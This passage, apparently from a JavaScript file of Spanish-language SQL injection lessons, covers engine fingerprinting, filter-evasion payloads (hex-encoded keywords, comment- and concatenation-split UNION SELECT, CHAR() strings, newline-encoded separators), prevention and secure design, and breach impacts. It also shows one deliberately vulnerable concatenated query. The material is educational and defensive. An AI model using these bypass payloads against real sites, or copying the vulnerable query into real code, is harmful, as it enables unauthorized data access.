<h3>Fingerprinting basado en tipos de error</h3>
<div class="warning-box">
<p>
Incluso cuando las aplicaciones no muestran mensajes de error completos, ciertos fragmentos revelan pistas del motor, como:
</p>

<ul>
  <li>Mensajes parciales que contienen nombres de funciones internas.</li>
  <li>Tipos de excepciones específicas del motor.</li>
  <li>Frases características del parser SQL.</li>
</ul>
</div>
<p>
Un ejemplo clásico sería el texto <code>"You have an error in your SQL syntax"</code> que es propio de <i><b>MySQL</b></i>. <i><b>SQL Server</b></i> utiliza expresiones como <code>"Incorrect syntax near"</code>, y <i><b>Oracle</b></i> presenta mensajes más extensos que incluyen referencias a su parser interno.
</p>

<p>
Aunque los mensajes estén truncados, las diferencias en la redacción y el estilo de los errores permiten deducir el motor utilizado.
</p>

<h3>Reconocimiento mediante canales indirectos</h3>
<div class="warning-box">
<p>
En algunos casos, el motor no revela errores ni reacciona de forma evidente ante funciones desconocidas. Sin embargo, ciertos comportamientos sutiles permiten distinguir el sistema. Entre ellos:
</p>

<ul>
  <li>Diferencias en tiempos de ejecución de funciones.</li>
  <li>Variaciones en la forma de interpretar espacios o caracteres especiales.</li>
  <li>Orden de evaluación de condiciones lógicas.</li>
  <li>Reacciones específicas ante consultas incompletas.</li>
</ul>
</div>
<p>
Incluso detalles como el manejo de valores nulos, o la forma en que el motor compara cadenas y números, pueden servir para deducir el sistema gestor.
</p>

<p>
Estas técnicas se utilizan en auditorías avanzadas cuando la superficie visible es mínima y la aplicación no muestra información interna.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    PortSwigger, SQL Injection Fingerprinting, [Online]. Available:
    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
      https://portswigger.net/web-security/sql-injection
    </a>
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
  </li>
</ul>
      `
    },
    'evasion-sqli': {
      id: 'evasion-sqli',
      title: 'Técnicas avanzadas de evasión y manipulación',
      description: 'Métodos para saltar filtros y controles tradicionales en SQLi.',
      category: 'sqli',
      htmlContent: `
        <p>
Cuando las aplicaciones implementan filtros básicos para bloquear cadenas sospechosas, como comillas o palabras clave, los atacantes emplean técnicas más avanzadas para reconstruir consultas SQL válidas y evadir los controles. Estas técnicas buscan aprovechar características internas del motor de base de datos, el comportamiento del analizador SQL y la forma en que la aplicación limpia o normaliza la entrada. A diferencia de las técnicas simples, estas estrategias se enfocan en manipular la consulta sin depender necesariamente de palabras clave obvias, fragmentos completos de SQL o patrones que un filtro superficial pueda detectar.
</p>

<p>
En esta lección se explican estrategias avanzadas utilizadas en auditorías y ataques, poniendo énfasis en su funcionamiento técnico y en lo que sucede internamente dentro del motor de base de datos. Se analizan técnicas como la ofuscación de payloads, el uso de codificación alternativa, la manipulación de operadores y la reconstrucción de expresiones, destacando la lógica detrás de cada mecanismo.
</p>

<h3>Evasión mediante codificación y transformaciones de caracteres</h3>

<p>
Algunos filtros verifican la presencia de palabras clave como <code>SELECT</code>, <code>UNION</code> o <code>DROP</code>. Sin embargo, varios motores permiten que las palabras clave se escriban en mayúsculas, minúsculas o combinaciones. Esto significa que expresiones como <code>select</code>, <code>SeLeCt</code> o <code>SELECT</code> son equivalentes. Si un filtro solo busca la forma exacta <code>SELECT</code>, una variante modificada permite evadir la restricción.
</p>

<p>
Además, algunos motores aceptan codificaciones alternativas dentro de las cadenas. Por ejemplo, caracteres como comillas o espacios pueden representarse en formato hexadecimal. Un texto como:
</p>

<pre><code class="language-html">0x73656C656374</code></pre>

<p>
representa la palabra <code>select</code>. Cuando el motor interpreta este valor, lo decodifica en tiempo de ejecución. Si el filtro solo busca palabras en texto plano, esta técnica permite reconstruir la instrucción dentro del motor sin que se detecte la palabra clave original.
</p>

<p>
Internamente, el motor analiza la cadena decodificada y la interpreta como SQL. La evasión funciona porque la aplicación valida la entrada en su representación original y no en la forma final que usa el motor.
</p>

<h3>Uso de operadores alternativos para reconstruir condiciones</h3>

<p>
Los filtros pueden buscar operadores como <code>OR</code> o <code>AND</code>, pero los motores de base de datos suelen proporcionar sinónimos o equivalencias. Por ejemplo, algunas variantes permiten usar el operador doble barra vertical, o funciones internas que actúan como equivalentes lógicos.
</p>

<p>
Considere una aplicación que bloquea <code>OR</code>. Un atacante puede intentar reconstruir la lógica mediante una expresión como:
</p>

<pre><code class="language-html">'||' = '|''</code></pre>

<p>
o mediante funciones como:
</p>

<pre><code class="language-html">COALESCE(1, 1)</code></pre>

<p>
que siempre devuelven un valor verdadero. La idea consiste en crear un comportamiento equivalente sin utilizar palabras clave supervisadas. La consulta final puede mantener su estructura, pero internamente el motor evaluará la expresión como verdadera, permitiendo manipular el resultado.
</p>

<p>
Esta técnica se basa en que el motor evalúa expresiones lógicas durante la ejecución y no requiere necesariamente operadores tradicionales.
</p>

<h3>Evasión mediante fragmentación de palabras clave</h3>

<p>
Los filtros que buscan cadenas completas pueden ser evadidos si la cadena se divide en segmentos que luego el servidor recompone como una única palabra clave. Algunos motores permiten concatenar cadenas mediante símbolos internos.
</p>

<p>
Una entrada como:
</p>

<pre><code class="language-html">UNI'||'ON SELECT</code></pre>

<p>
puede reconstruirse como <code>UNION SELECT</code> dentro del motor. Si el filtro solo busca la palabra <code>UNION</code> como un bloque completo, no detectará la expresión dividida.
</p>

<p>
El motor identifica que ambas partes forman una única cadena válida y la interpreta como una instrucción. La aplicación ve la entrada dividida, pero la base de datos la procesa en su forma final.
</p>

<h3>Uso de comentarios para interrumpir filtros rígidos</h3>

<p>
Los comentarios permiten insertar interrupciones dentro de palabras clave, evitando su detección cuando el filtro evalúa la entrada como texto plano.
</p>

<p>
En <code>SQL</code>, los comentarios pueden insertarse así:
</p>

<pre><code class="language-html">UN/**/ION SELECT</code></pre>

<p>
Aunque visualmente la palabra <code>UNION</code> está partida, el motor ignora el comentario y reconstruye la palabra clave. Si el filtro busca la palabra <code>UNION</code> en el texto, no la encontrará debido a la interrupción. Después, el motor interpreta la combinación como una única palabra clave válida.
</p>

<p>
Los motores procesan los comentarios antes de interpretar la consulta, lo cual permite que la vulnerabilidad sea explotable, aunque la aplicación haya aplicado filtros superficiales.
</p>

<h3>Manipulación mediante funciones internas para evitar comparaciones directas</h3>

<p>
En lugar de escribir valores de manera literal, un atacante puede usar funciones de conversión o transformación que permitan generar valores equivalentes sin introducir el texto prohibido. Por ejemplo, si la aplicación impide el uso de comillas simples, un atacante puede generar cadenas mediante <code>CHAR</code>.
</p>

<p>
Una expresión como:
</p>

<pre><code class="language-html">CHAR(97, 100, 109, 105, 110)</code></pre>

<p>
genera la palabra <code>admin</code>. El filtro no detecta comillas ni cadenas explícitas. Durante la ejecución, el motor genera la cadena en memoria, lo que permite construir condiciones equivalentes.
</p>

<p>
Esta técnica es útil cuando los filtros se enfocan en símbolos como comillas simples o dobles, pero pasan por alto funciones internas del motor que pueden generar cadenas idénticas.
</p>

<h3>Evasión mediante encadenamiento de consultas parciales</h3>

<p>
Algunos motores permiten que ciertas partes de la consulta sean opcionales o sustituyentes. Cuando la aplicación bloquea palabras clave específicas pero no todas las variantes posibles, el atacante puede reescribir parte de la lógica.
</p>

<p>
Por ejemplo, en lugar de utilizar <code>WHERE</code>, es posible utilizar <code>HAVING</code>. Ambas pueden filtrar resultados bajo ciertas condiciones. Si la aplicación filtra <code>WHERE</code> pero olvida <code>HAVING</code>, un atacante puede enviar una entrada como:
</p>

<pre><code class="language-htmle">HAVING 1=1</code></pre>

<p>
Esto reconstruye la misma lógica que <code>WHERE 1=1</code> en ciertos contextos. La evasión funciona porque la aplicación no detecta las posiciones exactas donde <code>HAVING</code> puede actuar como filtro.
</p>

<h3>Manipulación mediante subconsultas</h3>

<p>
Si un filtro bloquea palabras clave en posiciones predecibles, un atacante puede ocultarlas dentro de subconsultas. Por ejemplo, si una aplicación bloquea <code>SELECT</code> en el texto enviado por el usuario, el atacante puede intentar evitar la detección mediante una estructura como:
</p>

<pre><code class="language-html">(SELECT nombre FROM usuarios LIMIT 1)</code></pre>

<p>
Si la consulta principal no busca <code>SELECT</code> dentro de subconsultas, la expresión pasará el filtro. El motor evaluará la subconsulta y utilizará su resultado dentro de la lógica general.
</p>

<p>
Esta técnica aprovecha la capacidad del motor para interpretar múltiples niveles de consultas anidadas.
</p>

<h3>Evasión mediante espacios alternativos y caracteres invisibles</h3>

<p>
Algunos motores permiten reemplazar espacios con tabulaciones, saltos de línea o caracteres que no son visibles al usuario. Los filtros más simples solo buscan espacios estándar.
</p>

<p>
Expresiones como:
</p>

<pre><code class="language-html">UNI
ON SELECT</code></pre>

<pre><code class="language-html">UNION%0ASELECT</code></pre>

<p>
donde <code>%0A</code> representa un salto de línea codificado, pueden ser interpretadas como consultas válidas. Si el filtro busca secuencias continuas en una única línea, un atacante puede descomponerlas usando saltos o tabulaciones.
</p>

<p>
Los motores procesan estos caracteres como separadores válidos, lo cual permite ejecutar la consulta en su forma original.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
    PortSwigger, SQL Injection Cheatsheet, [Online]. Available:
    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
      https://portswigger.net/web-security/sql-injection
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, Microsoft Press.
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
  </li>
</ul>
      `
    },
    'prevencion-sqli': {
      id: 'prevencion-sqli',
      title: 'Estrategias de defensa y prevención',
      description: 'Buenas prácticas para proteger aplicaciones frente a la inyección SQL.',
      category: 'sqli',
      htmlContent: `
        <p>
La inyección SQL es una de las vulnerabilidades más críticas en aplicaciones web debido a que permite manipular directamente la lógica de consultas y acceder a información confidencial. Para evitar su explotación, es necesario aplicar prácticas de diseño seguro, validación estricta de entradas y mecanismos de consulta que eliminen la posibilidad de que datos proporcionados por el usuario se interpreten como instrucciones SQL. En esta lección se presentan estrategias técnicas que pueden aplicarse desde el diseño del sistema, así como ejemplos de código seguro que ilustran cómo bloquear las vías más comunes de explotación.
</p>

<h3>Uso de consultas parametrizadas y sentencias preparadas</h3>

<p>
Las consultas parametrizadas separan claramente la lógica de la consulta del contenido suministrado por el usuario. En lugar de insertar valores directamente en la cadena SQL, el motor trata los parámetros como datos, sin interpretarlos como instrucciones.
</p>

<p>Un ejemplo en Node.js con MySQL:</p>

<pre><code class="language-html highlight-secure">const consulta = "SELECT * FROM usuarios WHERE correo = ?";
conexion.query(consulta, [req.body.correo], function (err, resultados) {
    if (err) throw err;
    res.json(resultados);
});
</code></pre>

<p>
En este ejemplo, el signo <code>?</code> representa un marcador de posición. El motor inserta el valor del usuario como un parámetro y nunca lo evalúa como instrucción <code>SQL</code>. Esto protege incluso si el usuario introduce caracteres como comillas o palabras clave manipuladas.
</p>

<p>
El comportamiento preventivo radica en que el motor compila primero la consulta y luego inserta los valores, evitando completamente la concatenación directa.
</p>

<h3>Validación estricta y saneamiento de entradas</h3>

<p>
La validación de entradas busca asegurar que los valores suministrados cumplan con reglas predefinidas. No se basa en bloquear palabras clave, sino en limitar la estructura permitida según el contexto.
</p>

<p>Un ejemplo en JavaScript:</p>

<pre><code class="language-html highlight-secure">const correo = req.body.correo;
const patron = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

if (!patron.test(correo)) {
    return res.status(400).send("Formato de correo no válido");
}
</code></pre>

<p>
El uso de expresiones regulares limita la entrada a un formato válido. Si un atacante intenta introducir caracteres que puedan alterar una consulta, serán rechazados antes de llegar al motor de base de datos.
</p>

<p>
Este método protege la parte superior del flujo de datos, evitando que el usuario envíe parámetros que no deberían aceptarse en primer lugar.
</p>

<h3>Restricción de privilegios en la base de datos</h3>

<p>
El principio de mínimo privilegio indica que las cuentas utilizadas por la aplicación deben tener únicamente los permisos necesarios. Si una cuenta solo debe realizar consultas, no debe tener permisos para modificar datos ni para ejecutar funciones avanzadas.
</p>

<p>Por ejemplo, al crear el usuario para la aplicación:</p>

<pre><code class="language-html highlight-secure">GRANT SELECT, INSERT, UPDATE ON tienda.* TO 'app_user'@'localhost';
</code></pre>

<p>
Esta cuenta no podría eliminar tablas o modificar estructuras. Si un atacante lograra inyectar una consulta peligrosa, los privilegios limitados impedirían su ejecución.
</p>

<p>
El mecanismo se basa en que el motor detiene cualquier instrucción que no esté permitida para el usuario autenticado, aun si la consulta fue manipulada.
</p>

<h3>Uso de ORM seguros</h3>

<p>
Los ORM proporcionan capas de abstracción que generan consultas sin concatenar cadenas directamente. Aunque no eliminan por completo el riesgo, reducen significativamente la posibilidad de inyección si se utilizan correctamente.
</p>

<p>Ejemplo en Sequelize:</p>

<pre><code class="language-html highlight-secure">Usuario.findOne({
    where: { correo: req.body.correo }
});
</code></pre>

<p>
Aquí, el ORM genera la consulta utilizando parámetros internos, no concatenación. La lógica queda delegada al mecanismo del ORM, que incorpora protección contra inyección en la construcción de sus consultas.
</p>

<p>
El beneficio principal reside en que el desarrollador no escribe consultas manuales, reduciendo los puntos donde podrían cometerse errores.
</p>

<h3>Uso de listas blancas para valores controlados</h3>

<p>
Cuando un parámetro representa una opción limitada, como un campo de ordenamiento, no debe permitirse que el usuario envíe texto arbitrario. En lugar de ello, se implementa una lista blanca que valide únicamente opciones permitidas.
</p>

<p>Ejemplo:</p>

<pre><code class="language-html highlight-secure">const opcionesOrden = ["nombre", "precio", "fecha"];
const orden = opcionesOrden.includes(req.query.orden) ? req.query.orden : "nombre";

const consulta = "SELECT nombre, precio FROM productos ORDER BY " + orden;
</code></pre>

<p>
Aunque <code>ORDER BY</code> no acepta parámetros en todos los motores, validar que el valor provenga de una lista controlada evita que un atacante introduzca instrucciones.
</p>

<p>
Este enfoque funciona porque el valor final siempre pertenece a un conjunto seguro.
</p>

<h3>Monitoreo y registro de consultas</h3>

<p>
Registrar consultas permite detectar patrones sospechosos como intentos repetidos de manipulación o estructuras poco comunes. Aunque no evita la inyección por sí mismo, permite activar mecanismos de alerta y reforzar la seguridad.
</p>
<div class="warning-box">
<p>Un sistema de registro puede capturar:</p>

<ul>
  <li>Consultas fallidas.</li>
  <li>Consultas con errores constantes en un mismo parámetro.</li>
  <li>Parámetros excesivamente largos.</li>
  <li>Intentos de utilizar operadores o funciones no esperadas.</li>
</ul>
</div>
<p>
El análisis posterior ayuda a identificar anomalías que pueden indicar un ataque en curso.
</p>

<h3>Empleo de Web Application Firewalls (WAF)</h3>

<p>
Los WAF actúan como una barrera adicional entre la aplicación y el atacante. Aunque no sustituyen un diseño seguro, pueden detectar patrones comunes de inyección.
</p>
<div class="warning-box">
<p>
Los WAF analizan las solicitudes entrantes y pueden bloquear aquellas que incluyan:
</p>

<ul>
  <li>Palabras clave fuera de contexto.</li>
  <li>Estructuras que coinciden con payloads conocidos.</li>
  <li>Codificaciones sospechosas.</li>
  <li>Manipulación de parámetros repetitiva.</li>
</ul>
</div>
<p>
La protección es complementaria y resulta especialmente útil cuando la aplicación aún no implementa todas las medidas internas necesarias.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
    PortSwigger, Web Security Academy, Preventing SQL Injection, [Online]. Available:
    <a href="https://portswigger.net/web-security/sql-injection/prevention" target="_blank">
      https://portswigger.net/web-security/sql-injection/prevention
    </a>
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
  </li>
</ul>
        `
      },
    'impacto-sqli': {
      id: 'impacto-sqli',
      title: 'Impacto y consecuencias de la inyección SQL',
      description: 'Efectos y daños derivados de ataques exitosos de inyección SQL.',
      category: 'sqli',
      htmlContent: `
         <p>
La inyección SQL representa una de las amenazas más serias para las aplicaciones web debido a que permite que un atacante interactúe directamente con la base de datos. Cuando una explotación es exitosa, el impacto puede extenderse mucho más allá de la simple lectura de información. Los efectos abarcan daños operativos, violaciones de privacidad, interrupciones de servicio, pérdida de confianza y repercusiones legales significativas. Esta lección analiza las consecuencias más relevantes que una organización puede enfrentar, utilizando ejemplos reales para ilustrar cómo se desarrollan estos incidentes y por qué sus efectos suelen ser tan severos.
</p>

<h3>Exposición de información sensible</h3>

<p>
Una de las consecuencias más frecuentes de la inyección SQL es la obtención no autorizada de datos almacenados en la base. Cuando la aplicación concatena parámetros sin validación, el atacante puede manipular la consulta para devolver información a la que normalmente no tendría acceso.
</p>

<p>
Esta exposición afecta tanto datos personales como credenciales internas, historiales de transacciones y cualquier información que la cuenta utilizada por la aplicación tenga permiso de consultar. El daño se vuelve mayor cuando los usuarios confían en la organización para proteger datos altamente sensibles.
</p>

<p>
Un incidente relevante fue el ocurrido en TalkTalk, proveedor de telecomunicaciones en Reino Unido. La compañía mantenía un módulo heredado vulnerable a inyección SQL. Los atacantes enviaron consultas manipuladas para extraer información personal de más de ciento cincuenta mil clientes. Aunque los datos obtenidos no incluían números completos de tarjetas, sí comprometían direcciones, nombres, fechas de nacimiento y otra información susceptible de usarse para fraude y suplantación de identidad. La empresa, además de enfrentar una multa considerable por incumplir normas de protección de datos, experimentó una pérdida significativa de clientes en los meses posteriores.
</p>

<h3>Modificación o destrucción de datos operativos</h3>

<p>
Cuando la cuenta utilizada por la aplicación tiene permisos para modificar o eliminar registros, el impacto puede convertirse en un daño operativo severo. La manipulación maliciosa puede alterar información crítica, afectar procesos internos o comprometer la integridad de reportes y sistemas asociados.
</p>

<p>
Un atacante que logra una inyección SQL con permisos de escritura puede, por ejemplo, modificar estados de pedidos, alterar saldos en sistemas financieros o manipular niveles de inventario. En sistemas donde múltiples unidades dependen de datos sincronizados, una alteración masiva puede generar inconsistencias que requieran horas o días para corregirse.
</p>

<p>
Existen incidentes documentados donde atacantes lograron borrar tablas completas a través de consultas inyectadas. En uno de los casos más conocidos a nivel institucional, un sistema gubernamental de Utah sufrió una intrusión que permitió a los atacantes manipular y eliminar registros relacionados con la información electoral. Aunque existían copias de seguridad, el proceso de restauración tuvo consecuencias operativas que afectaron temporalmente la disponibilidad de servicios relacionados con el padrón electoral.
</p>

<h3>Interrupción de servicios y pérdida de disponibilidad</h3>

<p>
La explotación de una inyección SQL no solo afecta la integridad de los datos, sino también la disponibilidad. En muchos casos, los atacantes ejecutan consultas pesadas, inducen bloqueos en las tablas o fuerzan la caída del motor mediante errores intencionales. Cuando la aplicación depende de un sistema centralizado, incluso una interrupción breve puede generar un efecto en cadena.
</p>

<p>
Además, si el atacante logra eliminar registros o tablas completas, el sistema puede quedar inoperable hasta que se restauren datos desde respaldos. En escenarios donde las copias no están al día o la recuperación es compleja, esto se traduce en periodos prolongados de inactividad.
</p>

<p>
Una caída de servicio de este tipo puede afectar negocios que operan con alta disponibilidad, como comercio electrónico, servicios financieros o sistemas médicos.
</p>

<h3>Exfiltración seguida de movimiento lateral</h3>

<p>
En ciertos casos, la inyección SQL es solo la primera etapa de un ataque más amplio. Algunos motores permiten funciones que interactúan con el sistema de archivos o con otros componentes del servidor. Si la vulnerabilidad se combina con permisos elevados o malas prácticas de configuración, el atacante puede subir archivos, ejecutar funciones externas o usar la base como punto de pivote para acceder a otros sistemas internos.
</p>

<p>
En el ataque sufrido por Heartland Payment Systems, uno de los mayores procesadores de pago en Estados Unidos, la intrusión comenzó con una vulnerabilidad de inyección SQL en un sistema interno. Aunque la vulnerabilidad no exponía datos por sí sola, permitió la instalación de malware adicional. A partir de este punto, los atacantes interceptaron flujos de información sensible que pasaban por la red de procesamiento, comprometiendo decenas de millones de transacciones. El incidente derivó en costos financieros enormes, demandas colectivas y un daño reputacional de largo plazo.
</p>

<p>
Este tipo de evolución del ataque muestra que la inyección SQL puede servir como punto inicial para obtener control sistémico.
</p>

<h3>Impacto reputacional y pérdida de confianza</h3>

<p>
Las brechas de seguridad derivadas de inyección SQL suelen percibirse como fallas básicas del desarrollo seguro. Debido a que esta vulnerabilidad es ampliamente conocida desde hace años, su explotación transmite la impresión de negligencia o deficiente gestión de riesgos, lo que agrava la percepción pública.
</p>

<p>
Luego de los incidentes mencionados, empresas como TalkTalk y Heartland experimentaron efectos que perduraron más allá de la fase técnica del ataque. La pérdida de clientes, la caída en valor de mercado y la dificultad para recuperar confianza se convirtieron en consecuencias tan significativas como la brecha misma.
</p>

<p>
En sectores donde la protección de datos es un componente esencial del servicio, como telecomunicaciones o transacciones financieras, la reputación afecta directamente la viabilidad comercial.
</p>

<h3>Repercusiones legales y regulatorias</h3>

<p>
Cuando la información expuesta incluye datos personales, las organizaciones pueden verse obligadas a notificar a los afectados, rendir informes a autoridades regulatorias y enfrentar sanciones. Legislaciones como el GDPR en Europa o la Ley Federal de Protección de Datos Personales en México estipulan multas severas para las organizaciones que no protegen adecuadamente la información bajo su custodia.
</p>

<p>
En el caso de TalkTalk, la autoridad reguladora del Reino Unido concluyó que la vulnerabilidad explotada habría podido prevenirse fácilmente, lo que derivó en una multa significativa y obligaciones adicionales de cumplimiento. Este tipo de consecuencias afectan no solo las finanzas, sino también la estructura de gobernanza interna, obligando a rediseñar políticas y sistemas completos.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>
  <li>
    Information Commissioner’s Office (Reino Unido), Documentos de investigación y sanciones.
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, Wiley Publishing.
  </li>

  <li>
    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, Microsoft Press.
  </li>
</ul>
        `
      },
    'diseño-seguro-sqli': {
      id: 'diseño-seguro-sqli',
      title: 'Arquitectura segura y buenas prácticas contra la inyección SQL',
      description: 'Principios y recomendaciones para minimizar riesgos desde el diseño.',
      category: 'sqli',
      htmlContent: `
          <p>
Prevenir la inyección SQL no depende únicamente de validaciones o filtros aplicados en el código. Para minimizar el riesgo de manera efectiva, es necesario adoptar un enfoque arquitectónico que contemple múltiples capas de protección. La arquitectura segura considera cómo se gestionan las conexiones, cómo interactúan los servicios, cómo se encapsula el acceso a datos y qué controles complementarios se añaden para impedir que un atacante pueda manipular consultas. Esta lección se enfoca en patrones de diseño seguro y prácticas arquitectónicas que reducen, desde la raíz, la posibilidad de exposición a inyección SQL.
</p>

<h3>Separación estricta entre lógica de negocio y acceso a datos</h3>

<p>
Una característica clave de las arquitecturas seguras consiste en impedir que la lógica de negocio construya o manipule consultas SQL directamente. Para lograrlo, se emplean capas dedicadas de acceso a datos que encapsulan completamente la interacción con la base.
</p>

<p>Por ejemplo, en lugar de una construcción directa como:</p>

<pre><code class="language-html highlight-vulnerable">function obtenerUsuario(correo) {
    return conexion.query("SELECT * FROM usuarios WHERE correo = '" + correo + "'");
}
</code></pre>

<p>la arquitectura introduce una capa donde las consultas están centralizadas y parametrizadas:</p>

<pre><code class="language-html highlight-secure">function obtenerUsuario(correo) {
    const consulta = "SELECT * FROM usuarios WHERE correo = ?";
    return conexion.query(consulta, [correo]);
}
</code></pre>

<p>
Esta estructura impide que la lógica externa determine la forma de la consulta. Además, permite auditar y asegurar todas las operaciones SQL desde una ubicación única, facilitando la estandarización de prácticas seguras.
</p>

<h3>Uso de servicios intermedios para aislamiento del motor de base de datos</h3>

<p>
En arquitecturas modernas, la aplicación no interactúa directamente con el motor SQL, sino mediante un servicio intermedio, como una API dedicada o un microservicio de datos. El objetivo es aislar el motor y restringir la forma en que los datos llegan al backend.
</p>

<p>
Un ejemplo común consiste en exponer funciones específicas:
</p>

<p><code class="language-html highlight-secure">GET /api/usuarios/:id</code></p>

<p>
y permitir únicamente estas operaciones. En lugar de aceptar consultas flexibles o parámetros que alteren la lógica, el servicio implementa internamente consultas parametrizadas estrictas.
</p>

<p>
Este enfoque reduce la superficie de ataque porque el usuario nunca interactúa con consultas reales. La API controla completamente qué se ejecuta y cómo se ejecuta.
</p>

<h3>Implementación de almacenes de secretos y rotación de credenciales</h3>

<p>
Una arquitectura segura incluye un manejo centralizado de credenciales para evitar fugas de claves de base de datos. Los almacenes de secretos almacenan contraseñas, tokens y credenciales con cifrado fuerte, y permiten rotarlas periódicamente sin modificar el código.
</p>

<pre><code class="language-html highlight-secure">DB_USER=app_user
DB_PASS=clave_generada
DB_HOST=10.0.0.5
</code></pre>

<p>
El secreto nunca se incluye dentro del código fuente. Si un atacante obtuviera acceso parcial a la aplicación, la rotación frecuente impediría que un secreto comprometido siga siendo útil.
</p>

<p>
Este principio mitiga el riesgo derivado de ataques donde el objetivo final es escalar privilegios sobre la base de datos.
</p>

<h3>Limitación de consultas dinámicas en toda la arquitectura</h3>

<p>
Una arquitectura robusta evita que existan puntos donde las consultas sean generadas dinámicamente en función de entradas no controladas. Cuando sea estrictamente necesario generar SQL dinámico, se deben aplicar listas blancas, separación de lógica y parámetros validados.
</p>

<p>Por ejemplo, si se permite ordenar resultados:</p>

<pre><code class="language-html highlight-secure">const opcionesOrden = ["precio", "fecha", "nombre"];
const ordenFinal = opcionesOrden.includes(req.query.orden) ? req.query.orden : "fecha";
const consulta = "SELECT * FROM productos ORDER BY " + ordenFinal;
</code></pre>

<p>
Aquí la arquitectura limita explícitamente qué valores se pueden usar como orden, evitando completamente que el usuario inserte texto arbitrario.
</p>

<h3>Uso de procedimientos almacenados seguros</h3>

<p>
Los procedimientos almacenados permiten encapsular consultas y lógica dentro de la base de datos. Si se diseñan correctamente, aceptan únicamente parámetros y no permiten construir consultas libres. Esta encapsulación evita que un atacante pueda reconstruir consultas completas.
</p>

<p>Ejemplo en MySQL:</p>

<pre><code class="language-html highlight-secure">CREATE PROCEDURE obtenerProducto(IN p_id INT)
BEGIN
    SELECT nombre, precio FROM productos WHERE id = p_id;
END;
</code></pre>

<p>En la aplicación:</p>

<pre><code class="language-html highlight-secure">conexion.query("CALL obtenerProducto(?)", [req.query.id]);
</code></pre>

<p>
El procedimiento no permite modificar la estructura de la consulta y reduce la probabilidad de manipulación. La arquitectura se vuelve más resistente porque la lógica reside en el motor y no en concatenaciones externas.
</p>

<h3>Monitoreo arquitectónico y análisis de comportamiento</h3>

<p>
La arquitectura moderna incluye herramientas que permiten monitorear continuamente patrones de consulta, detectar anomalías y bloquear comportamientos atípicos. Los motores SQL avanzados pueden registrar:
</p>

<ul>
  <li>Consultas con errores recurrentes.</li>
  <li>Consultas demasiado largas o con patrones inusuales.</li>
  <li>Uso excesivo de operadores lógicos que no corresponden al flujo esperado.</li>
</ul>

<p>
Además, soluciones complementarias como:
</p>

<ul>
  <li>Sistemas de detección de intrusiones (IDS).</li>
  <li>WAF especializados.</li>
  <li>Logs centralizados con reglas de alerta.</li>
</ul>

<p>
permiten detectar intentos de manipulación incluso si no llegan a ejecutarse.
</p>

<p>
Este enfoque arquitectónico convierte la detección en un componente esencial del diseño, y no únicamente en una función reactiva.
</p>

<h3>Control de acceso basado en roles y segmentación de datos</h3>

<p>
Diseñar la arquitectura con privilegios granulares evita que una vulnerabilidad de SQL Injection tenga impacto total. La segmentación asegura que, incluso si un atacante obtiene acceso a una consulta, esta tenga alcance limitado.
</p>

<p>Ejemplo de permisos reducidos:</p>

<pre><code class="language-html highlight-secure">GRANT SELECT ON inventario.* TO 'app_lectura'@'localhost';
GRANT SELECT, INSERT, UPDATE ON ventas.* TO 'app_operaciones'@'localhost';
</code></pre>

<p>
Cada módulo de la aplicación opera con un usuario distinto, limitando al mínimo las acciones permitidas. Esta separación evita que un ataque aislado comprometa toda la base de datos.
</p>

<h3>Desacoplamiento entre componentes para reducir la propagación del ataque</h3>

<p>
Cuando los diferentes subsistemas interactúan mediante canales controlados, se limita la propagación de un ataque. Por ejemplo:
</p>

<ul>
  <li>Un módulo de reportes no debe tener acceso de escritura.</li>
  <li>Un módulo de autenticación no debe poder consultar información sensible de otros módulos.</li>
  <li>Los microservicios deben tener sus propias credenciales, aisladas del resto.</li>
</ul>

<p>
Este desacoplamiento permite que la arquitectura atenúe automáticamente el daño potencial, ya que cada componente opera dentro de límites estrictos.
</p>

<h3>Bibliografía</h3>

<ul>
  <li>
    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
    <a href="https://cheatsheetseries.owasp.org" target="_blank">
      https://cheatsheetseries.owasp.org
    </a>
  </li>

  <li>
    OWASP Foundation, SQL Injection, [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
      https://owasp.org/www-community/attacks/SQL_Injection
    </a>
  </li>

  <li>
